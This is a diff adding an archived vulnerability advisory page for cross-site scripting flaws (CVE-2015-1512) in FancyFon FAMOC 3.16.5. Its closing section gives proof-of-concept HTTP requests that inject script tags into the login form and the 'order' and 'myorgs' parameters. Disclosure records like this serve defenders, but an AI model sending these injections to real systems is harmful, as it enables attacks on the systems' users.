@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid72386<p><b><span style="font-size: 18pt;">FancyFon FAMOC Multiple Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/72386/info">info</a><br><a href="http://www.securityfocus.com/bid/72386/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/72386/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/72386/solution">solution</a><br><a href="http://www.securityfocus.com/bid/72386/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				72386
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2015-1512<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 27 2015 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 07 2015 05:23PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Matthias Deeg
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					FancyFon FAMOC 3.16.5 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					FancyFon FAMOC 3.17.4 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	To exploit these issues, an attacker must entice an unsuspecting victim to follow a malicious URI.                                               <br/> <br/>The following example data is available:                              <br/> <br/>POST /ui/system/login HTTP/1.1 <br/>Host: &amp;lt;www.example1.com&amp;gt; <br/>Content-Type: application/x-www-form-urlencoded <br/>Content-Length: 112 <br/>LoginForm%5Busername%5D=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3Cz%3D%22&amp;amp;LoginForm%5Bpassword%5D=password <br/> <br/>https://www.example.com/index.php?name=&amp;amp;order=%27%3E%3Cscript%3Ealert%281%29%3C/script%3E&amp;amp;page=1&amp;amp;myorgs=0 <br/>GET /index.php?name=&amp;amp;order=%27%3E%3Cscript%3Ealert%281%29%3C/script%3E&amp;amp;page=1&amp;amp;myorgs=0 HTTP/1.1 <br/>Host: &amp;lt;www.example1.com&amp;gt; <br/>Cookie: PHPSESSID=&amp;lt;SESSION_COOKIE&amp;gt; <br/> <br/>https://www.example.com/index.php?name=&amp;amp;order=&amp;amp;page=1&amp;amp;myorgs=%27%3E%3Cscript%3Ealert%281%29%3C/script%3E <br/> <br/>GET /index.php?name=&amp;amp;order=&amp;amp;page=1&amp;amp;myorgs=%27%3E%3Cscript%3Ealert%281%29%3C/script%3E HTTP/1.1 <br/>Host: &amp;lt;www.example1.com&amp;gt; <br/>Cookie: PHPSESSID=&amp;lt;SESSION_COOKIE&amp;gt;
+	
+		<ul>
+</ul>
+</div>
